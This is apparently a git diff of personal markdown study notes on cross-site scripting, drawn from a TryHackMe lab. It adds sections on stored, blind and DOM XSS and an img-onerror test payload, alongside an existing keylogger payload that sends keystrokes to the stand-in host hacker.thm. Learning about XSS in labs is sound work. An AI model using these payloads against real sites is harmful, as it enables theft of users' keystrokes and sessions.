@@ -13,6 +13,28 @@ In this scenario, attacker sends the payload to via URL and response is reflecte
 
 ![](Pasted%20image%2020241112181518.png)
 
+## Stored XSS
+
+In this payload is stored in the database and website uses it every from user load the page from the data making the attack persistent.
+
+![](Pasted%20image%2020241114200253.png)
+
+## Blind XSS
+
+In this attack, attacker cannot see the payload working on the website.
+
+## DOM XSS
+
+Look for variables that can be exploited in the JS code from the URL
+
+![](Pasted%20image%2020241114204112.png)
+
+This code take num variable from URL and appending to img tag this can be exploited by changing the URL to below
+
+![](Pasted%20image%2020241114205055.png)
+ 
+![](Pasted%20image%2020241114205018.png)
+
 # POC
 
 ### General usage
@@ -21,6 +43,10 @@ After putting JavaScript code to web page's input field if the page reacts as pe
 
 ```
 <script>alert('XSS');</script>
+```
+
+```
+<img src="123" onerror="alert('test')" />
 ```
 
 ### Session stealing
@@ -39,3 +65,8 @@ Below is similar version of JS code that sends base64 to attacker of the key - o
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 ```
 
+
+# References
+
+- https://tryhackme.com/r/room/xss
+- https://www.youtube.com/watch?v=EubBgig6qYs
